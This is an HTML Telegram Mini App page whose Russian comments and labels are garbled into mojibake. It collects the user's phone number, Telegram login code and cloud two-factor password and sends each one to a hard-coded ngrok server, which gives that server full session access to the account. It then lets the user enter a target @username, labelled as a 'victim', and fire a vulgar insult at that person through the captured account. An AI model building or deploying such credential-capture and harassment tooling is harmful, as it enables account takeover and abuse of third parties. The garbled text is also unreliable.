<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Dark Minimal</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            /* –¶–≤–µ—Ç–∞ –¥–ª—è —Ç–µ–º–Ω–æ–≥–æ –º–∏–Ω–∏–º–∞–ª–∏–∑–º–∞ */
            --text-primary: #ffffff;
            --text-secondary: #aaaaaa;
            --card-bg: rgba(30, 30, 30, 0.6); /* –¢–µ–º–Ω–æ–µ —Å—Ç–µ–∫–ª–æ */
            --accent: #0a84ff;
            --danger: #ff453a;
            --success: #32d74b;
            /* –ì—Ä–∞–¥–∏–µ–Ω—Ç –∫–Ω–æ–ø–∫–∏ (–±–æ–ª–µ–µ —Å—Ç—Ä–æ–≥–∏–π) */
            --btn-gradient: linear-gradient(135deg, #2b5876 0%, #4e4376 100%);
        }

        body { 
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", Helvetica, Arial, sans-serif;
            color: var(--text-primary);
            margin: 0; padding: 0;
            padding-top: max(20px, env(safe-area-inset-top));
            display: flex; flex-direction: column; align-items: center;
            min-height: 100vh;
            overflow: hidden;
            -webkit-tap-highlight-color: transparent;
            user-select: none;
            
            /* === –ñ–ò–í–û–ô –¢–ï–ú–ù–´–ô –§–û–ù === */
            background: linear-gradient(-45deg, #0f2027, #203a43, #2c5364, #24243e);
            background-size: 400% 400%;
            animation: gradientBG 15s ease infinite;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        /* HEADER */
        .header {
            width: 100%; max-width: 400px;
            padding: 15px 20px;
            display: flex; justify-content: flex-end;
            align-items: center;
            box-sizing: border-box; z-index: 100;
        }

        /* SWITCH (–ú–∏–Ω–∏–º–∞–ª–∏—Å—Ç–∏—á–Ω—ã–π) */
        .switch { position: relative; display: inline-block; width: 50px; height: 30px; }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider {
            position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0;
            background-color: rgba(255,255,255,0.1); transition: .3s; border-radius: 34px;
        }
        .slider:before {
            position: absolute; content: ""; 
            height: 24px; width: 24px; left: 3px; bottom: 3px;
            background-color: white; transition: .3s; border-radius: 50%;
        }
        input:checked + .slider { background-color: rgba(255,255,255,0.3); }
        input:checked + .slider:before { transform: translateX(20px); }

        /* MAIN CARD */
        .container { 
            width: 90%; max-width: 360px; margin-top: 40px;
            background: var(--card-bg); 
            backdrop-filter: blur(30px); -webkit-backdrop-filter: blur(30px);
            padding: 30px 25px; border-radius: 24px;
            /* –¢–æ–Ω–∫–∞—è –æ–±–≤–æ–¥–∫–∞ –≤–º–µ—Å—Ç–æ —Ç–µ–Ω–∏ */
            border: 1px solid rgba(255, 255, 255, 0.1);
            display: flex; flex-direction: column; align-items: center;
            transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
        }

        .container.final-mode {
            background: transparent; backdrop-filter: none; -webkit-backdrop-filter: none;
            border: none; margin-top: 80px;
        }

        /* INPUTS (–¢–µ–º–Ω—ã–µ) */
        input { 
            width: 100%; padding: 18px; margin-bottom: 15px; 
            border-radius: 14px; border: 1px solid rgba(255,255,255,0.1); 
            background: rgba(0, 0, 0, 0.2);
            color: var(--text-primary); font-size: 17px; text-align: center; outline: none; box-sizing: border-box;
            transition: all 0.3s;
        }
        input:focus { background: rgba(0, 0, 0, 0.4); border-color: rgba(255,255,255,0.3); }
        input::placeholder { color: var(--text-secondary); }
        
        .final-mode input { 
            background: rgba(0, 0, 0, 0.3); 
            font-weight: 600; letter-spacing: 0.5px;
            border: none;
        }

        /* BUTTONS */
        .std-btn { 
            width: 100%; padding: 18px; 
            background: var(--accent); color: white; 
            border: none; border-radius: 14px; 
            font-size: 17px; font-weight: 600; cursor: pointer; 
        }
        .std-btn:active { opacity: 0.8; transform: scale(0.98); }

        /* SCENE */
        .scene {
            position: fixed; top: 25%; left: 0; width: 100%; height: 300px;
            pointer-events: none; z-index: 50; display: none;
        }
        .scene.active { display: block; }
        
        .thrower { position: absolute; left: -80px; bottom: 0; font-size: 70px; transition: 0.4s; }
        .target { position: absolute; right: 20px; bottom: 0; font-size: 70px; transition: 0.2s; }
        .poop { position: absolute; left: 40px; bottom: 40px; font-size: 45px; opacity: 0; z-index: 55; }

        /* Particles */
        .particle {
            position: absolute; width: 6px; height: 6px;
            background-color: #8B4513; border-radius: 50%;
            pointer-events: none; z-index: 60;
        }

        /* Animations */
        @keyframes flyParabola {
            0% { transform: translate(0, 0) rotate(0deg); opacity: 1; }
            100% { transform: translate(75vw, -60px) rotate(1080deg); opacity: 1; }
        }
        @keyframes throwHand { 
            0% { transform: rotate(0deg) translateX(0); } 
            50% { transform: rotate(-30deg) translateX(30px); } 
            100% { transform: rotate(0deg) translateX(0); } 
        }
        @keyframes hitShake {
            0%, 100% { transform: scale(1); filter: none; }
            25% { transform: scale(0.85) rotate(-10deg); filter: grayscale(0.5); }
            75% { transform: scale(0.85) rotate(10deg); }
        }

        /* BIG BUTTON (Minimal) */
        .magic-zone { margin-top: 50px; position: relative; display: flex; justify-content: center; align-items: center; }
        
        #bigRoundBtn {
            width: 200px; height: 200px; /* –ß—É—Ç—å –º–µ–Ω—å—à–µ –¥–ª—è –∞–∫–∫—É—Ä–∞—Ç–Ω–æ—Å—Ç–∏ */
            border-radius: 50%; border: none;
            background: var(--btn-gradient);
            color: white; font-size: 28px; font-weight: 700;
            cursor: pointer; 
            text-transform: uppercase; letter-spacing: 2px;
            position: relative; z-index: 10;
            /* –°–≤–µ—á–µ–Ω–∏–µ */
            box-shadow: 0 0 40px rgba(78, 67, 118, 0.4); 
            animation: breathe 5s infinite ease-in-out;
            transition: all 0.2s;
            -webkit-tap-highlight-color: transparent;
            display: flex; justify-content: center; align-items: center;
        }
        
        #bigRoundBtn:active { transform: scale(0.95); box-shadow: 0 0 20px rgba(78, 67, 118, 0.6); }
        #bigRoundBtn:disabled { filter: grayscale(1); opacity: 0.5; cursor: default; animation: none; }

        /* Loader */
        .spinner {
            width: 30px; height: 30px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            display: none;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes breathe { 0%, 100% { transform: scale(1); opacity: 0.9; } 50% { transform: scale(1.02); opacity: 1; } }

        .hidden { display: none !important; }
        #status { 
            margin-top: 30px; font-size: 16px; font-weight: 500; min-height: 25px; 
            text-align: center; color: rgba(255,255,255,0.7);
        }
        .error { color: #ff453a !important; }
    </style>
</head>
<body>

    <div class="header">
        <label class="switch">
            <input type="checkbox" id="animToggle" checked onchange="toggleAnim()">
            <span class="slider"></span>
        </label>
    </div>

    <div class="scene" id="scene">
        <div class="thrower" id="thrower">üë∫</div>
        <div class="poop" id="poop">üí©</div>
        <div class="target" id="victim">üò±</div>
    </div>

    <div class="container" id="mainCard">
        
        <div id="step1" style="width: 100%;">
            <input type="tel" id="phone" placeholder="+7 999 000 00 00" oninput="formatPhone(this)">
            <button class="std-btn" onclick="login()">–î–∞–ª–µ–µ</button>
        </div>

        <div id="step2" class="hidden" style="width: 100%;">
            <input type="number" id="code" placeholder="–ö–æ–¥ –∏–∑ Telegram">
            <button class="std-btn" onclick="sendCode()">–í–æ–π—Ç–∏</button>
        </div>

        <div id="stepPassword" class="hidden" style="width: 100%;">
            <input type="password" id="password" placeholder="–û–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å">
            <button class="std-btn" onclick="sendPassword()">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
        </div>

        <div id="step3" class="hidden" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
            <input type="text" id="targetInput" placeholder="@username" style="text-align: center;" oninput="saveTarget()">
            <div class="magic-zone">
                <button id="bigRoundBtn" onclick="fire()">
                    <span id="btnText">—Ö—É–µ—Å–æ—Å–∏—Ç—å</span>
                    <div class="spinner" id="btnLoader"></div>
                </button>
            </div>
        </div>

        <div id="status"></div>
    </div>

    <script>
        // ==========================================
        // üîó –°–°–´–õ–ö–ê NGROK
        const SERVER_URL = "https://stiffish-queenie-unbuskined.ngrok-free.dev";
        // ==========================================

        const tg = window.Telegram.WebApp;
        tg.expand(); tg.enableClosingConfirmation();

        // Audio
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        function playPop() {
            if (audioCtx.state === 'suspended') audioCtx.resume();
            const osc = audioCtx.createOscillator(); const gain = audioCtx.createGain();
            const randomPitch = 600 + Math.random() * 200; 
            osc.frequency.setValueAtTime(randomPitch, audioCtx.currentTime);
            osc.frequency.exponentialRampToValueAtTime(100, audioCtx.currentTime + 0.15);
            gain.gain.setValueAtTime(0.3, audioCtx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.15);
            osc.connect(gain); gain.connect(audioCtx.destination);
            osc.start(); osc.stop(audioCtx.currentTime + 0.15);
        }

        // Particles
        function createParticles(x, y) {
            const colors = ['#8B4513', '#5D4037', '#795548'];
            for(let i=0; i<12; i++) {
                const p = document.createElement('div'); p.className = 'particle';
                p.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                p.style.left = x + 'px'; p.style.top = y + 'px';
                document.body.appendChild(p);
                const angle = Math.random() * 2 * Math.PI;
                const v = 50 + Math.random() * 100;
                const tx = Math.cos(angle) * v; const ty = Math.sin(angle) * v;
                p.animate([{transform: 'translate(0,0) scale(1)', opacity: 1}, {transform: `translate(${tx}px, ${ty}px) scale(0)`, opacity: 0}], {duration: 600, easing: 'ease-out'}).onfinish = () => p.remove();
            }
        }

        // Init
        function formatPhone(input) {
            let val = input.value.replace(/\D/g, '');
            if (val.length > 0 && val[0] !== '7') val = '7' + val;
            let f = '+7';
            if (val.length > 1) f += ' ' + val.substring(1, 4);
            if (val.length > 4) f += ' ' + val.substring(4, 7);
            if (val.length > 7) f += ' ' + val.substring(7, 9);
            if (val.length > 9) f += ' ' + val.substring(9, 11);
            input.value = f;
        }

        let myPhone = localStorage.getItem("ph") || "";
        if(myPhone) document.getElementById('phone').value = myPhone;
        let lastTarget = localStorage.getItem("lastTarget") || "";
        if(lastTarget) document.getElementById('targetInput').value = lastTarget;
        let isAnimEnabled = localStorage.getItem("anim") !== "false"; 
        document.getElementById('animToggle').checked = isAnimEnabled;

        function saveTarget() { localStorage.setItem("lastTarget", document.getElementById('targetInput').value); }
        function toggleAnim() { isAnimEnabled = document.getElementById('animToggle').checked; localStorage.setItem("anim", isAnimEnabled); tg.HapticFeedback.selectionChanged(); }
        function showStatus(text, isErr = false) { const el = document.getElementById('status'); el.innerText = text; el.className = isErr ? 'error' : 'success'; if(text && isErr) tg.HapticFeedback.notificationOccurred('error'); }
        async function req(path, body) { try { const r = await fetch(SERVER_URL + path, { method: 'POST', headers: {'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true'}, body: JSON.stringify(body) }); return await r.json(); } catch (e) { return {status: 'error', message: '–°–µ—Ä–≤–µ—Ä –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω'}; } }
        
        function showFinal() { document.getElementById('mainCard').classList.add('final-mode'); document.getElementById('step3').classList.remove('hidden'); tg.HapticFeedback.notificationOccurred('success'); }
        
        async function login() { 
            let rawPhone = document.getElementById('phone').value.replace(/\D/g, ''); 
            if(rawPhone.length < 11) return showStatus("–û—à–∏–±–∫–∞ –Ω–æ–º–µ—Ä–∞", true); 
            myPhone = "+" + rawPhone; localStorage.setItem("ph", myPhone); 
            showStatus("‚è≥"); let res = await req('/login/start', {phone: myPhone}); handleRes(res); 
        }
        async function sendCode() { let code = document.getElementById('code').value.trim(); showStatus("‚è≥", false); let res = await req('/login/complete', {phone: myPhone, code: code}); handleRes(res); }
        async function sendPassword() { let pass = document.getElementById('password').value; showStatus("‚è≥", false); let res = await req('/login/password', {phone: myPhone, password: pass}); handleRes(res); }

        function handleRes(res) {
            if(res.status === 'ok') {
                document.getElementById('step1').classList.add('hidden'); document.getElementById('step2').classList.add('hidden'); document.getElementById('stepPassword').classList.add('hidden'); document.getElementById('status').innerText = "";
                if(res.step === 'authorized') showFinal();
                else if(res.step === 'code_needed') { document.getElementById('step2').classList.remove('hidden'); showStatus("–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥"); }
                else if(res.step === 'password_needed') { document.getElementById('stepPassword').classList.remove('hidden'); showStatus("–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å"); }
            } else showStatus(res.message, true);
        }

        function runPoopAnimation() {
            const scene = document.getElementById('scene'); const thrower = document.getElementById('thrower'); const poop = document.getElementById('poop'); const victim = document.getElementById('victim'); const victimRect = victim.getBoundingClientRect();
            scene.classList.add('active'); thrower.style.left = "20px";
            setTimeout(() => { thrower.style.animation = "throwHand 0.4s ease"; poop.style.animation = "flyParabola 0.7s cubic-bezier(0.25, 1, 0.5, 1) forwards"; playPop(); }, 300);
            setTimeout(() => { victim.style.animation = "hitShake 0.4s ease"; tg.HapticFeedback.impactOccurred('heavy'); createParticles(victimRect.left + 35, victimRect.top + 35); }, 900);
            setTimeout(() => { scene.classList.remove('active'); thrower.style.left = "-80px"; poop.style.animation = "none"; thrower.style.animation = "none"; victim.style.animation = "none"; }, 2300);
        }

        async function fire() {
            if (audioCtx.state === 'suspended') audioCtx.resume();
            let target = document.getElementById('targetInput').value.trim();
            if(!target) { tg.HapticFeedback.notificationOccurred('warning'); return showStatus("–£–∫–∞–∂–∏—Ç–µ –∂–µ—Ä—Ç–≤—É", true); }
            if(target.startsWith('@')) target = target.substring(1);
            
            const btn = document.getElementById('bigRoundBtn'); 
            const btnText = document.getElementById('btnText');
            const btnLoader = document.getElementById('btnLoader');
            
            btn.disabled = true; btnText.style.display = 'none'; btnLoader.style.display = 'block'; document.getElementById('status').innerText = ""; 
            if(isAnimEnabled) runPoopAnimation(); else tg.HapticFeedback.impactOccurred('medium');
            
            let res = await req('/greet', {phone: myPhone, target: target});
            setTimeout(() => { 
                btn.disabled = false; btnText.style.display = 'block'; btnLoader.style.display = 'none';
                if(res.status === 'ok') showStatus("–°–¥–µ–ª–∞–Ω–æ."); else showStatus(res.message, true);
            }, 1200);
        }
    </script>
</body>
</html>
